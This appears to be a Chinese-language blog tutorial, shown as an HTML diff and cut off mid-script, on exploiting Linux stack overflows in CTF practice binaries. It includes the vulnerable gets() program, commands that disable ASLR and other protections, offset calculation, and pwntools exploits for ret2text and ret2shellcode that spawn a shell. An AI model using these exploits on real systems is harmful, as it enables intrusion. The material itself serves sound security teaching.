@@ -1,0 +1,1494 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/hackerrank.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/hackerrank.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/hackerrank.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="linux,pwn,栈溢出,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="之前介绍了Windows x86平台下栈溢出漏洞的开放与利用，鉴于CTF基本都是Linux，还有实际开发环境，很多智能设备的系统都是基于Linux，所以从很现实的需求出发，一定要学习学习Linux下漏洞的分析。 ref：  CTF-WIKI：https://ctf-wiki.github.io/ctf-wiki/pwn/readme-zh/蒸米大佬的一步一步学rop http://www.anqu">
+<meta name="keywords" content="linux,pwn,栈溢出">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Linux Pwn-缓冲区溢出利用">
+<meta property="og:url" content="https://cool-y.github.io/2019/07/16/linux-pwn-32/index.html">
+<meta property="og:site_name" content="混元霹雳手">
+<meta property="og:description" content="之前介绍了Windows x86平台下栈溢出漏洞的开放与利用，鉴于CTF基本都是Linux，还有实际开发环境，很多智能设备的系统都是基于Linux，所以从很现实的需求出发，一定要学习学习Linux下漏洞的分析。 ref：  CTF-WIKI：https://ctf-wiki.github.io/ctf-wiki/pwn/readme-zh/蒸米大佬的一步一步学rop http://www.anqu">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://res.cloudinary.com/dozyfkbg3/image/upload/v1563267241/pwn/4a7227aa9f00bd2fd45d363da4cf25c6fd425638.jpg">
+<meta property="og:updated_time" content="2019-07-16T09:14:29.618Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Linux Pwn-缓冲区溢出利用">
+<meta name="twitter:description" content="之前介绍了Windows x86平台下栈溢出漏洞的开放与利用，鉴于CTF基本都是Linux，还有实际开发环境，很多智能设备的系统都是基于Linux，所以从很现实的需求出发，一定要学习学习Linux下漏洞的分析。 ref：  CTF-WIKI：https://ctf-wiki.github.io/ctf-wiki/pwn/readme-zh/蒸米大佬的一步一步学rop http://www.anqu">
+<meta name="twitter:image" content="https://res.cloudinary.com/dozyfkbg3/image/upload/v1563267241/pwn/4a7227aa9f00bd2fd45d363da4cf25c6fd425638.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://cool-y.github.io/2019/07/16/linux-pwn-32/">
+
+
+
+
+
+  <title>Linux Pwn-缓冲区溢出利用 | 混元霹雳手</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">混元霹雳手</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">没人比我更懂中医#MAGA</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-bookmarks">
+          <a href="/bookmarks/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-map"></i> <br>
+            
+            书签
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://cool-y.github.io/2019/07/16/linux-pwn-32/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Cool-Y">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="混元霹雳手">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Linux Pwn-缓冲区溢出利用</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-07-16T17:11:42+08:00">
+                2019-07-16
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Pwn二进制漏洞/" itemprop="url" rel="index">
+                    <span itemprop="name">Pwn二进制漏洞</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2019/07/16/linux-pwn-32/" class="leancloud_visitors" data-flag-title="Linux Pwn-缓冲区溢出利用">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                <span title="字数统计">
+                  6k 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                <span title="阅读时长">
+                  28 分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>之前介绍了Windows x86平台下栈溢出漏洞的开放与利用，鉴于CTF基本都是Linux，还有实际开发环境，很多智能设备的系统都是基于Linux，所以从很现实的需求出发，一定要学习学习Linux下漏洞的分析。</p>
+<p><strong>ref：</strong></p>
+<blockquote>
+<p>CTF-WIKI：<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/readme-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/readme-zh/</a><br>蒸米大佬的一步一步学rop <a href="http://www.anquan.us/static/drops/tips-6597.html" target="_blank" rel="noopener">http://www.anquan.us/static/drops/tips-6597.html</a></p>
+</blockquote>
+<p><strong>工具：</strong></p>
+<blockquote>
+<p>objdump、ldd、ROPgadget、readelf、<a href="https://ctf-wiki.github.io/ctf-tools/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-tools/</a><br><a href="https://github.com/ctf-wiki/ctf-challenges" target="_blank" rel="noopener">https://github.com/ctf-wiki/ctf-challenges</a></p>
+</blockquote>
+<h1 id="0x00-Control-Flow-hijack"><a href="#0x00-Control-Flow-hijack" class="headerlink" title="0x00 Control Flow hijack"></a>0x00 Control Flow hijack</h1><p>和Windows一样，栈溢出的根本原因在于当前计算机的体系结构没有区分代码段和数据段，因此我们可以通过修改数据段的内容（返回地址），改变程序的执行流程，从而达到程序流劫持的效果。<br>改变计算机体系来规避漏洞目前是不可能的，防御者为了应对这种攻击，提出了各种增大攻击难度的措施（没有绝对安全的系统），最常见的有：DEP堆栈不可执行、ASLR内存地址随机化、GS/Canary栈保护等。<br>我们从最简单的入手，不开启任何防护，先了解栈溢出的基本操作，然后逐步增加防御措施。</p>
+<h2 id="寻找危险函数"><a href="#寻找危险函数" class="headerlink" title="寻找危险函数"></a>寻找危险函数</h2><p>这里有一个漏洞程序<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">void success() &#123; puts(&quot;You Hava already controlled it.&quot;); &#125;</span><br><span class="line">void vulnerable() &#123;</span><br><span class="line">  char s[12];</span><br><span class="line">  gets(s);</span><br><span class="line">  puts(s);</span><br><span class="line">  return;</span><br><span class="line">&#125;</span><br><span class="line">int main(int argc, char **argv) &#123;</span><br><span class="line">  vulnerable();</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>当我们看到gets时就应该知道如何入手了，这是一个非常危险的函数，无条件的接受任意大的字符串。<br>历史上，莫里斯蠕虫第一种蠕虫病毒就利用了 gets 这个危险函数实现了栈溢出。<br>先进行编译，关闭防御措施：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -m32 -no-pie -fno-stack-protector -z execstack stack1.c -o stack1</span><br><span class="line">stack1.c: In function ‘vulnerable’:</span><br><span class="line">stack1.c:6:3: warning: implicit declaration of function ‘gets’; did you mean ‘fgets’? [-Wimplicit-function-declaration]</span><br><span class="line">   gets(s);</span><br><span class="line">   ^~~~</span><br><span class="line">   fgets</span><br><span class="line">/tmp/ccUuPrSy.o: In function `vulnerable&apos;:</span><br><span class="line">stack1.c:(.text+0x45): warning: the `gets&apos; function is dangerous and should not be used.</span><br></pre></td></tr></table></figure></p>
+<p>编译器都会提示你，gets不要再用了。-fno-stack-protector 和-z execstack分便会关掉栈保护的DEP.-no-PIE关闭 PIE（Position Independent Executable），避免加载基址被打乱。接下来关闭整个linux系统的ASLR保护：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ su</span><br><span class="line">Password:</span><br><span class="line">root@ubuntu:/home/han/ck/pwn/linux/stack_demo# echo 0 &gt; /proc/sys/kernel/randomize_va_space</span><br><span class="line">root@ubuntu:/home/han/ck/pwn/linux/stack_demo# exit</span><br><span class="line">exit</span><br></pre></td></tr></table></figure></p>
+<h2 id="计算溢出点的位置"><a href="#计算溢出点的位置" class="headerlink" title="计算溢出点的位置"></a>计算溢出点的位置</h2><p>什么是溢出点的位置：从缓冲区到覆盖返回地址所需要的字节数<br>我们同样也可以使用工具pattern_create和pattern_offset来计算，这里我们先手动计算：<br>把stack1拖入IDA进行反汇编分析：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">int vulnerable()</span><br><span class="line">&#123;</span><br><span class="line">  char s; // [sp+4h] [bp-14h]@1</span><br><span class="line"></span><br><span class="line">  gets(&amp;s);</span><br><span class="line">  return puts(&amp;s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>在伪代码窗口，我们可看到变量s和bp的距离为14h，再加上old bp的4字节，到ret的距离就是18h。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">             +-----------------+</span><br><span class="line">             |     retaddr     |</span><br><span class="line">             +-----------------+</span><br><span class="line">             |     saved ebp   |</span><br><span class="line">      ebp---&gt;+-----------------+</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">s,ebp-0x14--&gt;+-----------------+</span><br></pre></td></tr></table></figure></p>
+<h2 id="劫持ret的地址"><a href="#劫持ret的地址" class="headerlink" title="劫持ret的地址"></a>劫持ret的地址</h2><p>这里我们想让程序跳转到success()，从IDA直接可以获取0x08048456<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">.text:08048456 success         proc near</span><br><span class="line">.text:08048456</span><br><span class="line">.text:08048456 var_4           = dword ptr -4</span><br><span class="line">.text:08048456</span><br><span class="line">.text:08048456                 push    ebp</span><br><span class="line">.text:08048457                 mov     ebp, esp</span><br><span class="line">.text:08048459                 push    ebx</span><br><span class="line">.text:0804845A                 sub     esp, 4</span><br><span class="line">.text:0804845D                 call    __x86_get_pc_thunk_ax</span><br><span class="line">.text:08048462                 add     eax, 1B9Eh</span><br><span class="line">.text:08048467                 sub     esp, 0Ch</span><br><span class="line">.text:0804846A                 lea     edx, (aYouHavaAlready - 804A000h)[eax] ; &quot;You Hava already controlled it.&quot;</span><br><span class="line">.text:08048470                 push    edx             ; s</span><br><span class="line">.text:08048471                 mov     ebx, eax</span><br><span class="line">.text:08048473                 call    _puts</span><br><span class="line">.text:08048478                 add     esp, 10h</span><br><span class="line">.text:0804847B                 nop</span><br><span class="line">.text:0804847C                 mov     ebx, [ebp+var_4]</span><br><span class="line">.text:0804847F                 leave</span><br><span class="line">.text:08048480                 retn</span><br><span class="line">.text:08048480 success         endp</span><br></pre></td></tr></table></figure></p>
+<p>那么如果我们构造的字符串为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x18*&apos;a&apos;+success_addr</span><br></pre></td></tr></table></figure></p>
+<p>这样就会将retaddr覆盖巍峨哦success_addr,此时栈结构为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">             +-----------------+</span><br><span class="line">             |    0x0804843B   |</span><br><span class="line">             +-----------------+</span><br><span class="line">             |       aaaa      |</span><br><span class="line">      ebp---&gt;+-----------------+</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">s,ebp-0x14--&gt;+-----------------+</span><br></pre></td></tr></table></figure></p>
+<h2 id="pwn测试"><a href="#pwn测试" class="headerlink" title="pwn测试"></a>pwn测试</h2><p>使用pwntools，怎么使用，以具体的exp来介绍，比如stack1的exp如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&apos;./stack1&apos;)</span><br><span class="line">ret_addr = 0x08048456</span><br><span class="line">offset = 0x18</span><br><span class="line"></span><br><span class="line">payload = &apos;A&apos; * offset + p32(ret_addr)</span><br><span class="line">print(ret_addr,p32(ret_addr))</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
+<blockquote>
+<ol>
+<li>连接<br>本地process(),远程remote()</li>
+<li>数据处理<br>p32、p64是打包（转换成二进制），u32、u64是解包</li>
+<li>IO模块<br>send(data) : 发送数据<br>sendline(data) : 发送一行数据，相当于在末尾加\n<br>interactive() : 与shell交互</li>
+</ol>
+</blockquote>
+<p>执行exp：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ python stack1.py</span><br><span class="line">[+] Starting local process &apos;./stack1&apos;: pid 8328</span><br><span class="line">(134513750, &apos;V\x84\x04\x08&apos;)</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAV\x84\x0</span><br><span class="line">You Hava already controlled it.</span><br><span class="line">[*] Got EOF while reading in interactive</span><br><span class="line">$</span><br></pre></td></tr></table></figure></p>
+<hr>
+<h1 id="0X01-ret2shellcode"><a href="#0X01-ret2shellcode" class="headerlink" title="0X01 ret2shellcode"></a>0X01 ret2shellcode</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>ret2shellcode，即控制程序执行 shellcode 代码。shellcode 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell。一般来说，shellcode 需要我们自己填充。这其实是另外一种典型的利用方法，即此时我们需要自己去填充一些可执行的代码。</p>
+<p>在栈溢出的基础上，要想执行 shellcode，需要对应的 binary 在运行时，shellcode 所在的区域具有可执行权限(NX disabled)。</p>
+<h2 id="检查保护情况"><a href="#检查保护情况" class="headerlink" title="检查保护情况"></a>检查保护情况</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ checksec ret2shellcode</span><br><span class="line">[*] &apos;/home/han/ck/pwn/linux/re2shellcode/ret2shellcode&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    RWX:      Has RWX segments</span><br><span class="line"></span><br><span class="line">$ cat /proc/sys/kernel/randomize_va_space</span><br><span class="line">0</span><br></pre></td></tr></table></figure>
+<p>可以看出源程序几乎没有开启任何保护，并且有可读，可写，可执行段。</p>
+<h2 id="查看危险函数"><a href="#查看危险函数" class="headerlink" title="查看危险函数"></a>查看危险函数</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  int v4; // [sp+1Ch] [bp-64h]@1</span><br><span class="line"></span><br><span class="line">  setvbuf(stdout, 0, 2, 0);</span><br><span class="line">  setvbuf(stdin, 0, 1, 0);</span><br><span class="line">  puts(&quot;No system for you this time !!!&quot;);</span><br><span class="line">  gets((char *)&amp;v4);</span><br><span class="line">  strncpy(buf2, (const char *)&amp;v4, 0x64u);</span><br><span class="line">  printf(&quot;bye bye ~&quot;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到，漏洞函数依然还是gets，不过这次还把v4复制到了buf2处。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.bss:0804A080                 public buf2</span><br><span class="line">.bss:0804A080 ; char buf2[100]</span><br></pre></td></tr></table></figure></p>
+<p>通过<code>sudo cat /proc/[pid]/maps</code>查看,会发现buf2和stack都是rwx的。</p>
+<h2 id="计算溢出点"><a href="#计算溢出点" class="headerlink" title="计算溢出点"></a>计算溢出点</h2><p>可以看到该字符串是通过相对于 esp 的索引，所以我们需要进行调试，将断点下在 call gets处，查看 esp，ebp<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0xffffc99c --&gt; 0xf7ffd000 --&gt; 0x26f34</span><br><span class="line">EBX: 0x0</span><br><span class="line">ECX: 0xf7fb2dc7 --&gt; 0xfb38900a</span><br><span class="line">EDX: 0xf7fb3890 --&gt; 0x0</span><br><span class="line">ESI: 0xf7fb2000 --&gt; 0x1d4d6c</span><br><span class="line">EDI: 0x0</span><br><span class="line">EBP: 0xffffca08 --&gt; 0x0</span><br><span class="line">ESP: 0xffffc980 --&gt; 0xffffc99c --&gt; 0xf7ffd000 --&gt; 0x26f34</span><br><span class="line">EIP: 0x8048593 (&lt;main+102&gt;:	call   0x80483d0 &lt;gets@plt&gt;)</span><br><span class="line">EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x8048587 &lt;main+90&gt;:	call   0x80483e0 &lt;puts@plt&gt;</span><br><span class="line">   0x804858c &lt;main+95&gt;:	lea    eax,[esp+0x1c]</span><br><span class="line">   0x8048590 &lt;main+99&gt;:	mov    DWORD PTR [esp],eax</span><br><span class="line">=&gt; 0x8048593 &lt;main+102&gt;:	call   0x80483d0 &lt;gets@plt&gt;</span><br><span class="line">   0x8048598 &lt;main+107&gt;:	mov    DWORD PTR [esp+0x8],0x64</span><br><span class="line">   0x80485a0 &lt;main+115&gt;:	lea    eax,[esp+0x1c]</span><br><span class="line">   0x80485a4 &lt;main+119&gt;:	mov    DWORD PTR [esp+0x4],eax</span><br><span class="line">   0x80485a8 &lt;main+123&gt;:	mov    DWORD PTR [esp],0x804a080</span><br><span class="line">Guessed arguments:</span><br><span class="line">arg[0]: 0xffffc99c --&gt; 0xf7ffd000 --&gt; 0x26f34</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xffffc980 --&gt; 0xffffc99c --&gt; 0xf7ffd000 --&gt; 0x26f34</span><br><span class="line">0004| 0xffffc984 --&gt; 0x0</span><br><span class="line">0008| 0xffffc988 --&gt; 0x1</span><br><span class="line">0012| 0xffffc98c --&gt; 0x0</span><br><span class="line">0016| 0xffffc990 --&gt; 0x0</span><br><span class="line">0020| 0xffffc994 --&gt; 0xc30000</span><br><span class="line">0024| 0xffffc998 --&gt; 0x0</span><br><span class="line">0028| 0xffffc99c --&gt; 0xf7ffd000 --&gt; 0x26f34</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x08048593 in main () at ret2shellcode.c:14</span><br><span class="line">14	ret2shellcode.c: No such file or directory.</span><br></pre></td></tr></table></figure></p>
+<p>可以看到 esp 为 0xffffc980，ebp 为0xffffca08，同时 v4 相对于 esp 的索引为 [esp+0x1c]，所以，v4 的地址为 0xffffc99c，所以 s 相对于 ebp 的偏移为 0x6C，所以相对于返回地址的偏移为 0x6c+4。</p>
+<h2 id="劫持ret的地址-1"><a href="#劫持ret的地址-1" class="headerlink" title="劫持ret的地址"></a>劫持ret的地址</h2><p>这次我们想要程序执行shellcode，那么我们可以把shellcode放在任何可执行的位置，比如buf2或栈上，位置的地址就是我们需要覆盖ret_addr的值</p>
+<h2 id="pwn测试-1"><a href="#pwn测试-1" class="headerlink" title="pwn测试"></a>pwn测试</h2><p>控制程序执行bss段的shellcode<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&apos;./ret2shellcode&apos;)</span><br><span class="line"></span><br><span class="line">ret_addr = 0x0804A080</span><br><span class="line">offset = 0x6c + 4</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.i386.linux.sh())</span><br><span class="line">payload = shellcode.ljust(offset,&apos;a&apos;) + p32(ret_addr)</span><br><span class="line">#payload = shellcode + &apos;a&apos;*(offset - len(shellcode)) + 